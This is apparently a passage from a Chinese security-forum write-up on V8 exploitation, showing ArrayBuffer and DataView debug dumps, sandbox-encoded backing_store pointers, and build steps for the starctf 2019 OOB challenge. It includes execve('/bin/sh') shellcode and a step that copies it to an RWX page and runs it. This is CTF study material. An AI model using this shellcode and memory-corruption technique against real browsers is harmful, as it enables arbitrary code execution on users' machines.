
```
DebugPrint: 0x1db000048039: [JSArrayBuffer]                         

 - map: 0x1db000189c91 <Map[52](HOLEY_ELEMENTS)> [FastProperties]                                                                       

 - prototype: 0x1db000189e25 <Object map = 0x1db000189cb9>                                                                             

 - elements: 0x1db000000725 <FixedArray[0]> [HOLEY_ELEMENTS]                                                                            

 - cpp_heap_wrappable: 0                                            

 - backing_store: 0x1db100000000                                    

 - byte_length: 16                                                  

 - max_byte_length: 16                                              

 - detach key: 0x1db000000069 <undefined>                           

 - detachable                                                       

 - properties: 0x1db000000725 <FixedArray[0]>                       

 - All own properties (excluding elements): {}                      

0x1db000189c91: [Map] in OldSpace                                   

 - map: 0x1db0001816d9 <MetaMap (0x1db000181729 <NativeContext[295]>)>                                                                  

 - type: JS_ARRAY_BUFFER_TYPE                                       

 - instance size: 52                                                

 - inobject properties: 0                                           

 - unused property fields: 0                                        

 - elements kind: HOLEY_ELEMENTS                                    

 - enum length: invalid                                             

 - stable_map                                                       

 - back pointer: 0x1db000000069 <undefined>                         

 - prototype_validity cell: 0x1db000000a89 <Cell value= 1>                                                                              

 - instance descriptors (own) #0: 0x1db000000759 <DescriptorArray[0]>                                                                   

 - prototype: 0x1db000189e25 <Object map = 0x1db000189cb9>                                                                              

 - constructor: 0x1db000189c41 <JSFunction ArrayBuffer (sfi = 0x1db000291bfd)>                                                          

 - dependent code: 0x1db000000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>                                                            

 - construction counter: 0                                          



DebugPrint: 0x1db00004806d: [JSDataView]                            

 - map: 0x1db000187561 <Map[48](HOLEY_ELEMENTS)> [FastProperties]                                                                       

 - prototype: 0x1db000187781 <Object map = 0x1db000187589>                                                                              

 - elements: 0x1db000000725 <FixedArray[0]> [HOLEY_ELEMENTS]                                                                            

 - buffer =0x1db000048039 <ArrayBuffer map = 0x1db000189c91>                                                                            

 - byte_offset: 0                                                   

 - byte_length: 16                                                  

 - properties: 0x1db000000725 <FixedArray[0]>                       

 - All own properties (excluding elements): {}                      

0x1db000187561: [Map] in OldSpace                                   

 - map: 0x1db0001816d9 <MetaMap (0x1db000181729 <NativeContext[295]>)>                                                                  

 - type: JS_DATA_VIEW_TYPE                                          

 - instance size: 48                                                

 - inobject properties: 0                                           

 - unused property fields: 0                                        

 - elements kind: HOLEY_ELEMENTS                                    

 - enum length: invalid                                             

 - stable_map                                                       

 - back pointer: 0x1db000000069 <undefined>                         

 - prototype_validity cell: 0x1db000000a89 <Cell value= 1>                                                                              

 - instance descriptors (own) #0: 0x1db000000759 <DescriptorArray[0]>                                                                   

 - prototype: 0x1db000187781 <Object map = 0x1db000187589>                                                                              

 - constructor: 0x1db00018752d <JSFunction DataView (sfi = 0x1db000292b5d)>                                                             

 - dependent code: 0x1db000000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>                                                            

 - construction counter: 0 
```
这里有一个跟原文不一样的地方，原文没开`sandbox`，`backing_store`是`malloc`原生堆的裸指针

我这里编译开了`sandbox`

| 对象 | 地址 | 说明 |
| --- | --- | --- |
| `JSArrayBuffer` 本体 | 0x1db0_00048039 | 在 4GB 指针笼内(基址 0x1db_00000000) |
| `backing_store` 指向 | 0x1db1_00000000 | 恰好 = 笼基址 + 4GB |

## data_buf

![图片描述](https://bbs.kanxue.com/upload/attach/202609/1075564_MFSA4X3U6VBYPSR.webp)

![图片描述](https://bbs.kanxue.com/upload/attach/202609/1075564_WW2ECXEB6P2X8NV.webp)

`double`型的`2.0`就是`0x4000000000000000`

![图片描述](https://bbs.kanxue.com/upload/attach/202609/1075564_B98VTRPCTUSUHAN.webp)

可以看出`data_buf`的值存储在一段连续的地址中

原文的思路是通过修改`backing_store`字段的值为`rwx`内存地址，来达到写`shellcode`的目的

![图片描述](https://bbs.kanxue.com/upload/attach/202609/1075564_9H6VHTPN4RYQG5A.webp)

我们发现 `backing_store` 那 8 字节存的不是 `0x1db100000000` 本身

```
真实地址

0x1db100000000



        ↓ 减 sandbox base



offset = 0x1db100000000 - 0x1db000000000

       = 0x100000000



        ↓ 左移 24 bit



raw = 0x100000000 << 24

    = 0x0100000000000000
```

这里还想`copy_shellcode_to_rwx`就得打`sandbox` escape了

## 利用

```
var shellcode = [

  0x2fbb485299583b6an,

  0x5368732f6e69622fn,

  0x050f5e5457525f54n   //execve(/bin/sh,0,0)

];

copy_shellcode_to_rwx(shellcode, rwx_page_addr);

f();
```

通过`f()`执行`shellcode`

## starctf 2019 OOB

[db8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3j5i4u0S2P5W2)9J5k6h3k6S2K9i4c8Z5i4K6u0r3x3U0l9I4z5g2)9J5k6o6p5J5i4K6u0V1x3e0y4Q4x3X3c8K6N6r3q4J5j5%4c8X3i4K6u0V1L8$3!0T1i4K6u0V1N6U0S2Q4x3X3c8A6L8X3c8W2M7s2c8Z5i4K6u0r3](https://bbs.kanxue.com/elink@40fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3j5i4u0S2P5W2)9J5k6h3k6S2K9i4c8Z5i4K6u0r3x3U0l9I4z5g2)9J5k6o6p5J5i4K6u0V1x3e0y4Q4x3X3c8K6N6r3q4J5j5%4c8X3i4K6u0V1L8$3!0T1i4K6u0V1N6U0S2Q4x3X3c8A6L8X3c8W2M7s2c8Z5i4K6u0r3)

这里有完整的patch

## 环境构造

```
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
gclient sync -D
cd ..
vim oob.diff
cd v8
git apply ../oob.diff
python2 build/linux/sysroot_scripts/install-sysroot.py --arch=amd64
```

这里编译的时候遇到一个问题，`v8`的版本太老得用到`python2`，但`apt`不提供了，只能开个`docker`了

```
docker run -it \
  --name v8-startctf \
  -v ~/v8:/work \
  ubuntu:20.04 \
  bash
apt update
apt install -y python2 git curl ca-certificates build-essential
```

![图片描述](https://bbs.kanxue.com/upload/attach/202609/1075564_CU8MP6EKX3Q2X9Y.webp)

![图片描述](https://bbs.kanxue.com/upload/attach/202609/1075564_YBE2PW8YK8WEEHJ.webp)

```
python build/linux/sysroot_scripts/install-sysroot.py --arch=amd64
apt install -y pkg-config
./buildtools/linux64/gn gen out.gn/x64_startctf.release --args='
v8_monolithic=true
v8_use_external_startup_data=false
is_component_build=false
is_debug=false
target_cpu="x64"
use_goma=false
goma_dir="None"
v8_enable_backtrace=true
v8_enable_disassembler=true
v8_enable_object_print=true
v8_enable_verify_heap=true
treat_warnings_as_errors=false
'
apt install -y ninja-build
time ninja -C out.gn/x64_startctf.release d8
```

![图片描述](https://bbs.kanxue.com/upload/attach/202609/1075564_Y2NUVADSS2RY8RR.webp)

还挺快

![图片描述](https://bbs.kanxue.com/upload/attach/202609/1075564_B5RF9UK69SXZWQW.webp)
